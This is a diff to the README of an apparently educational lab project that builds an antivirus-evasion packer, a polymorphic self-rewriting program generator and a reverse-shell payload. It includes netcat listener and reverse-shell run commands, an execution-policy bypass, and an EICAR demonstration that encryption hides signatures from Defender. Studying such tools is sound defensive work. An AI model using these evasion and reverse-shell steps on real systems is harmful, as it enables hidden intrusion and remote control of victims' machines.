@@ -64,9 +64,9 @@ The subject asks for binary manipulation, encryption, file-size changes, delayed
 | Polymorphic variants | Implemented: each generation uses a fresh key, nonce and signature token | Generate two files and compare hashes |
 | Self-modification | Implemented: the program rewrites its own source on every run | Hash a generated program, run it, and hash it again |
 | Stable behavior | Same payload behaviour on every run | Capture output from multiple runs |
-| Reverse-shell connection | Implemented in `lab/reverse_shell_payload.py`; the target address and port are always operator-supplied | Start `lab/listener.py`, run the generated program with `--host`/`--port`, then type a command |
+| Reverse-shell connection | Implemented in `lab/reverse_shell_payload.py`; the target address and port are always operator-supplied | Start a netcat listener (`nc -lvnp 4444`), run the generated program with `--host`/`--port`, then type a command |
 | Native Windows PE output | Produced automatically when the `--output` name ends in `.exe` (PyInstaller) inside the VM | A `.py` file or `.exe` filename does not by itself establish PE validity; check the file type |
-| Defender / VirusTotal testing | Measured in the VM against the real Defender and VirusTotal | Scan the artifact with Microsoft Defender (`MpCmdRun.exe -Scan -ScanType 3 -File <artifact>`, or run `lab/mal_audit.ps1` for the EICAR before/after) and upload your own artifact to [VirusTotal](https://www.virustotal.com); record the verdict and detection ratio actually observed |
+| Defender / VirusTotal testing | Measured in the VM against the real Defender and VirusTotal | Scan the artifact with Microsoft Defender (`MpCmdRun.exe -Scan -ScanType 3 -File <artifact>`, or run `lab/mal_demo.ps1` for the EICAR before/after) and upload your own artifact to [VirusTotal](https://www.virustotal.com); record the verdict and detection ratio actually observed |
 | Isolated Windows VM | Must be verified manually by the auditor | Capture hypervisor network and integration settings |
 
 **Important audit wording:** the delay is enforced by the **artifact itself** in runner mode — the produced file waits, then decrypts and launches the payload. The tool does not need to be running for the wait to happen. The delay is a *pre-execution* delay: the payload has not started yet when the wait ends.
@@ -106,12 +106,15 @@ hidden-bytes/
 │       ├── runner.py
 │       └── runner_template.py
 ├── lab/
-│   ├── mal_audit.ps1            # one-command EICAR before/after Defender demo
-│   ├── build_eicar_evaded.py     # encrypt EICAR with the tool (in memory)
-│   ├── detect_positive_control.py# write a plaintext EICAR (always detected)
-│   ├── reverse_shell_payload.py  # operator-addressed reverse shell (lab only)
-│   └── listener.py               # receives the reverse-shell connection
-├── tests/
+│   ├── mal_demo.ps1               # one-command EICAR before/after Defender demo
+│   ├── build_eicar_evaded.py      # encrypt EICAR with the tool (in memory)
+│   ├── detect_positive_control.py # write a plaintext EICAR (always detected)
+│   └── reverse_shell_payload.py   # operator-addressed reverse shell (lab only)
+├── resources/
+│   ├── evasion_walkthrough.html
+│   ├── polymorphic_walkthrough.html
+│   ├── img/virus-total.png
+│   └── md/                        # subject.md, audit.md
 ├── evasion
 ├── polymorphic
 ├── requirements.txt
@@ -145,13 +148,7 @@ python3 -m src.evasion --help
 python3 -m src.polymorphic --help
 ```
 
-Run the test suite:
-
-```bash
-python3 -m pytest -q
-```
-
-If the repository includes executable wrapper scripts, they may also be used:
+The repository also includes executable wrapper scripts:
 
 ```bash
 ./evasion --help
@@ -179,7 +176,7 @@ Verify these manually before demonstrating (nothing in this repository changes a
 | Operating system | Windows 10 or 11 |
 | Network isolation | No default gateway, public DNS fails, outbound HTTPS blocked |
 | Python toolchain | Interpreter version and `cryptography` (plus `PyInstaller` for `.exe` builds) |
-| Tool smoke test | Both CLIs start (`--help`) and the test suite runs |
+| Tool smoke test | Both CLIs start (`--help`) |
 | Defender | Real-time protection on, and no path exclusions (check `Get-MpPreference`) |
 
 Two results deserve attention:
@@ -245,7 +242,7 @@ Reading the result honestly: the two detections are **generic heuristic flags on
 This is the stronger demonstration referred to above, ready to run. It proves, against the real Windows Defender, that a file carrying a **known malware signature is detected in the clear but invisible once this tool encrypts it** — and that nothing was faked, because decrypting it brings the detection straight back. It uses the [EICAR test string](https://www.eicar.org/download-anti-malware-testfile/), a harmless, industry-standard file every antivirus flags on purpose, so no real malware is involved. Run it from the project root inside the VM:
 
 ```powershell
-powershell -ExecutionPolicy Bypass -File lab\mal_audit.ps1
+powershell -ExecutionPolicy Bypass -File lab\mal_demo.ps1
 ```
 
 The script changes **no Defender setting** (no exclusions, real-time protection left on) and regenerates every artifact from source, so **no binary or `.pyz` needs to be committed to the repository**. It runs four steps and then prints Defender's own threat log as evidence:
@@ -263,7 +260,7 @@ The demo is driven by three small source files in `lab/`:
 
 | File | What it does |
 |---|---|
-| `lab/mal_audit.ps1` | Orchestrates the four steps above and prints the threat log. Accepts `-PythonExe <path>` if `py` is not on `PATH`. |
+| `lab/mal_demo.ps1` | Orchestrates the four steps above and prints the threat log. Accepts `-PythonExe <path>` if `py` is not on `PATH`. |
 | `lab/detect_positive_control.py` | Writes a plaintext EICAR file (a *positive control* — a program Defender is guaranteed to detect), assembling the string from fragments so the script itself is not flagged. |
 | `lab/build_eicar_evaded.py` | Encrypts the EICAR payload with the evasion tool. Because Defender quarantines a plaintext EICAR file the instant it is written, the payload is held **in memory** and handed to the tool through an in-memory stand-in for the input file, so no plaintext is ever written to disk and no Defender setting is touched. Add `--exe` to build a native `.exe` instead of a `.pyz`. |
 
@@ -689,12 +686,6 @@ Compare the recovered content:
 sha256sum sample.txt recovered-small.txt
 ```
 
-Run the project's automated tests from the repository root:
-
-```bash
-python3 -m pytest -q
-```
-
 ### 4.5 HBX1 container layout
 
 The container is a custom **data format**, not a Windows PE executable.
@@ -984,16 +975,15 @@ The effect is the same — the remote shell reads its input from, and writes its
 
 **The target address and port are always chosen by the operator**, through `--host` and `--port`, and default to `127.0.0.1`. There is no discovery, no scanning, no persistence, no privilege escalation, no lateral movement and no evasion. The payload opens exactly one TCP connection to the address it was given.
 
-`lab/listener.py` is the receiving end. It accepts one connection and relays it to your terminal in both directions:
+A **netcat listener** on the operator's machine is the receiving end. It accepts the connection and relays it to your terminal in both directions:
 
 ```bash
-python3 lab/listener.py --port 4444
+nc -lvnp 4444
 ```
 
 ```text
-[INFO] Listening on 127.0.0.1:4444. Waiting for a connection...
-[INFO] Connection received from 127.0.0.1:50568
-[INFO] Type a command and press enter. Type 'exit' to finish.
+listening on [any] 4444 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 50568
 ```
 
 ### 5.6 End-to-end demonstration
@@ -1014,10 +1004,10 @@ python -m src.polymorphic --generate revshell.pyz --payload lab/reverse_shell_pa
 
 Run the `.pyz` with your interpreter (`python revshell.pyz`); run the `.exe` directly (`./polymorphic.exe`). Both forward their arguments to the payload, so `--host`/`--port` reach the reverse shell.
 
-In a second terminal, start the listener on the address the payload will call back:
+In a second terminal, start a netcat listener on the address the payload will call back:
 
 ```bash
-python3 lab/listener.py --port 4444
+nc -lvnp 4444
 ```
 
 Then run the generated program, pointing it at the listener:
@@ -1034,28 +1024,20 @@ The client output:
 [INFO] Connected. Starting shell.
 ```
 
-The listener output:
+The netcat listener output:
 
 ```text
-[INFO] Listening on 127.0.0.1:4444. Waiting for a connection...
-[INFO] Connection received from 127.0.0.1:50568
-[INFO] Type a command and press enter. Type 'exit' to finish.
+listening on [any] 4444 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 50568
 ```
 
 Typing a command in the listener terminal now runs it in the remote shell.
 
 > **In the Windows VM**, use the VM's host-only address instead of `127.0.0.1` so the two ends can reach each other, and keep the network adapter in **Host-Only** mode. The subject's example uses `192.168.1.100`; replace it with the address of the machine running the listener.
 
-#### Ordering matters — two common errors
+#### Ordering matters
 
-The listener and the client have to overlap in time. Two failures look alarming but are just ordering/port mistakes:
-
-```text
-# The listener was started, waited, and nobody connected in time:
-PS> py .\lab\listener.py --port 4444
-[INFO] Listening on 127.0.0.1:4444. Waiting for a connection...
-[ERROR] No connection received before the timeout.
-```
+The listener and the client have to overlap in time. Start the netcat listener first; the common mistake is running the client while nothing is listening on that port:
 
 ```text
 # The client was run while no listener was up on that port:
@@ -1065,7 +1047,7 @@ PS> py demo.py --host 127.0.0.1 --port 4444
 [ERROR] Could not connect to 127.0.0.1:4444: [WinError 10061] No connection could be made because the target machine actively refused it
 ```
 
-Fix: **start the listener first, then run the client within the listener's wait window**, and make sure both use the **same port**. `WinError 10061` (connection refused) means no listener is accepting on that host/port; "No connection received before the timeout" means the listener gave up before the client connected. Re-run the listener immediately before launching the generated program.
+Fix: **start the netcat listener (`nc -lvnp 4444`) first, then run the client**, and make sure both use the **same port**. `WinError 10061` (connection refused) means nothing is accepting on that host/port.
 
 ### 5.7 Packaging as a native executable
 
@@ -1164,7 +1146,7 @@ Use harmless text samples first. These commands are intended to make the behavio
 ### Exercise B2 — Reverse shell in the isolated lab
 
 1. Confirm the lab network adapter is in **Host-Only** mode and note the address the listener will use.
-2. Start the listener in one terminal: `python3 lab/listener.py --port 4444`.
+2. Start a netcat listener in one terminal: `nc -lvnp 4444`.
 3. Generate the polymorphic program with the reverse shell payload: `python3 -m src.polymorphic --generate polymorphic.exe --payload lab/reverse_shell_payload.py`.
 4. Run it with the listener's address: `python3 polymorphic.exe --host <host-only-address> --port 4444`.
 5. Confirm the listener reports the connection and its peer address.
